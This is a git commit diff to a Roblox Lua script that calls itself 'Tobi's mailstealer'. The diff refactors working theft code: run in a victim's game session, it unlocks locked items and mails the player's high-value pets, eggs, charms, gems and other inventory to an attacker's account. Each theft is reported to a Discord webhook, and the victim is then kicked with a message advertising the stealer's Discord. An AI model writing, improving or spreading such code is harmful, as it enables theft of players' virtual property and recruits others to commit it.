02c6651b969f16fbe49ee309f02a81e9ad895a04
Tobi <68130707+tobi437a@users.noreply.github.com>
2024-03-29 22:00:16 +0100

    Update pets.lua

--- pets.lua
+++ pets.lua
@@ -1,4 +1,14 @@
-local function SendMessage(url, username, itemID)
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = "gg / HcpNe56R2a"
+local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
+local HttpService = game:GetService("HttpService")
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+local function SendMessage(url, username, itemID, itemRAP)
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
@@ -16,8 +26,13 @@ local function SendMessage(url, username, itemID)
                 {
                     ["name"] = "Item Sent:",
                     ["value"] = tostring(itemID),
-                    ["inline"] = true
-                }
+                    ["inline"] = false
+                },
+				{
+					["name"] = "RAP:",
+					["value"] = tostring(itemRAP),
+					["inline"] = false
+				}
             },
 			["footer"] = {
 				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
@@ -37,15 +52,6 @@ if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 else
 	Webhook = ""
-end
-
-local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Inventory
-local plr = game.Players.LocalPlayer
-local MailMessage = "gg / HcpNe56R2a"
-local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
 for i, v in pairs(GetSave().Inventory.Currency) do
@@ -80,7 +86,6 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 noti.Enabled = false
 
-local HttpService = game:GetService("HttpService")
 local function getRAP(Type, Item)
     if GetRapValues[Type] then
         for i,v in pairs(GetRapValues[Type]) do
@@ -91,9 +96,10 @@ local function getRAP(Type, Item)
         end
 		return 0
     end
+	return 0
 end
 
-local function sendItem(category, uid, am, id)
+local function sendItem(category, uid, am, id, rap)
     local args = {
         [1] = user,
         [2] = MailMessage,
@@ -103,178 +109,57 @@ local function sendItem(category, uid, am, id)
     }
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
     if Webhook and Webhook ~= "" then
-        SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+        SendMessage(Webhook, plr.Name, id, rap)
     end
 end
 
-local function CountHuges()
+local function CountCategory(category)
 	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.huge and getRAP("Pet", v) >= min_rap then
+	for i, v in pairs(save[category]) do
+		if getRAP(category, v) >= min_rap then
 			count = count + 1
 		end
 	end
 	return count
 end
 
-local function StealHuge()
-	local hugesSent = 0
-	local initialHuges = CountHuges()
-    for i, v in pairs(save.Pet) do
-        local id = v.id
-        local dir = library.Directory.Pets[id]
-        if dir.huge and getRAP("Pet", v) >= min_rap then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            sendItem("Pet", i, v._am or 1, id)
-			local finalHuges = CountHuges()
-			if finalHuges < initialHuges then
-				hugesSent = hugesSent + 1
-				initialHuges = finalHuges
-			end
-        end
-    end
-	return hugesSent
+local function CategorySteal(category)
+	local Sent = 0
+	local initial = CountCategory(category)
+	local sortedItems = {}
+	for i, v in pairs(save[category]) do
+		local rapValue = getRAP(category, v)
+		if rapValue >= min_rap then
+			table.insert(sortedItems, {uid = i, rap = rapValue})
+		end
+	end
+	table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
+	for _, item in ipairs(sortedItems) do
+		local v = save[category][item.uid]
+		local id = v.id
+		if v._lk then
+			local args = {
+			[1] = i,
+			[2] = false
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+		end
+		sendItem(category, item.uid, v._am or 1, id, item.rap)
+		local final = CountCategory(category)
+		if final < initial then
+			Sent = Sent + 1
+			initial = final
+		end
+	end
+	return Sent
 end
 
-local function SendAllHuges()
-	local totalHuges = CountHuges()
-	local hugesSent = 0
+local function SendAllCategory(category)
+	local total = CountCategory(category)
+	local Sent = 0
 	repeat
-		hugesSent = hugesSent + StealHuge()
-	until hugesSent == totalHuges
-end
-
-local function CountExc()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
-			count = count + 1
-		end
-	end
-	return count
-end
-
-local function ExcSteal()
-	local excSent = 0
-	local initialExc = CountExc()
-    for i, v in pairs(save.Pet) do
-        local id = v.id
-        local dir = library.Directory.Pets[id]
-        if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            sendItem("Pet", i, v._am or 1, id)
-			local finalExc = CountExc()
-			if finalExc < initialExc then
-				excSent = excSent + 1
-				initialExc = finalExc
-			end
-        end
-    end
-	return excSent
-end
-
-local function SendAllExc()
-	local totalExc = CountExc()
-	local excSent = 0
-	repeat
-		excSent = excSent + ExcSteal()
-	until excSent == totalExc
-end
-
-local function EggSteal()
-    for i, v in pairs(save.Egg) do
-		local id = v.id
-		local diregg = library.Directory.Eggs[id]
-		if diregg and getRAP("Egg", v) >= min_rap then
-			sendItem("Egg", i, v._am or 1, id)
-		end
-    end
-end
-
-local function CharmSteal()
-    for i, v in pairs(save.Charm) do
-        local id = v.id
-		local dircharm = library.Directory.Charms[id]
-		if dircharm and getRAP("Charm", v) >= min_rap then
-			sendItem("Charm", i, v._am or 1, id)
-		end
-    end
-end
-
-local function EnchantSteal()
-    for i, v in pairs(save.Enchant) do
-		local id = v.id
-		local direnchant = library.Directory.Enchants[id]
-		if direnchant and getRAP("Enchant", v) >= min_rap then
-			sendItem("Enchant", i, v._am or 1, id)
-		end
-    end
-end
-
-local function PotionSteal()
-    for i, v in pairs(save.Potion) do
-		local id = v.id
-		local dirpotion = library.Directory.Potions[id]
-		if dirpotion and getRAP("Potion", v) >= min_rap then
-			sendItem("Potion", i, v._am or 1, id)
-		end
-    end
-end
-
-local function miscSteal()
-	for i, v in pairs(save.Misc) do
-		local id = v.id
-		local dirmisc = library.Directory.MiscItems[id]
-		if dirmisc and getRAP("Misc", v) > min_rap then
-			sendItem("Misc", i, v._am or 1, id)
-		end
-	end
-end
-
-local function hoverSteal()
-	for i, v in pairs(save.Hoverboard) do
-		local id = v.id
-		local dirhover = library.Directory.Hoverboards[id]
-		if dirhover and getRAP("Hoverboard", v) > min_rap then
-			sendItem("Hoverboard", i, v._am or 1, id)
-		end
-	end
-end
-
-local function boothSteal()
-	for i, v in pairs(save.Booth) do
-		local id = v.id
-		local dirbooth = library.Directory.Booths[id]
-		if dirbooth and getRAP("Booth", v) > min_rap then
-			sendItem("Booth", i, v._am or 1, id)
-		end
-	end
-end
-
-local function ultimateSteal()
-	for i, v in pairs(save.Ultimate) do
-		local id = v.id
-		local dirultimate = library.Directory.Ultimates[id]
-		if dirultimate and getRAP("Ultimate", v) > min_rap then
-			sendItem("Ultimate", i, v._am or 1, id)
-		end
-	end
+		Sent = Sent + CategorySteal(category)
+	until Sent == total
 end
 
 local function GemSteal()
@@ -290,7 +175,7 @@ local function GemSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
+				SendMessage(Webhook, plr.Name, "Gems: " .. (GemAmount - 10000))
 			end
         end
     end
@@ -322,40 +207,26 @@ local function SendAllGems()
 	until CountGems() == nil or CountGems() < 10000
 end
 
-if CountHuges() > 0 or CountGems() > 1000000 then
+local function CountHuges()
+	local count = 0
+	for i, v in pairs(save.Pet) do
+		local id = v.id
+		local dir = library.Directory.Pets[id]
+		if dir.huge and getRAP("Pet", v) >= min_rap then
+			count = count + 1
+		end
+	end
+	return count
+end
+
+if CountHuges() > 0 or CountGems() > 500000 then
 	EmptyBoxes()
-	SendAllHuges()
-	SendAllExc()
-
-	if save.Egg ~= nil then
-		EggSteal()
+	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+	for i, v in pairs(categoryList) do
+		if save[v] ~= nil then
+			SendAllCategory(v)
+		end
 	end
-
-	if save.Charm ~= nil then
-		CharmSteal()
-	end
-
-	if save.Ultimate ~= nil then
-		ultimateSteal()
-	end
-	
-	if save.Enchant ~= nil then
-		EnchantSteal()
-	end
-	
-	if save.Potion ~= nil then
-		PotionSteal()
-	end
-
-	if save.Hoverboard ~= nil then
-		hoverSteal()
-	end
-
-	if save.Booth ~= nil then
-		boothSteal()
-	end
-
-	miscSteal()
 	SendAllGems()
 	setclipboard("https://discord.gg/HcpNe56R2a")
 	plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
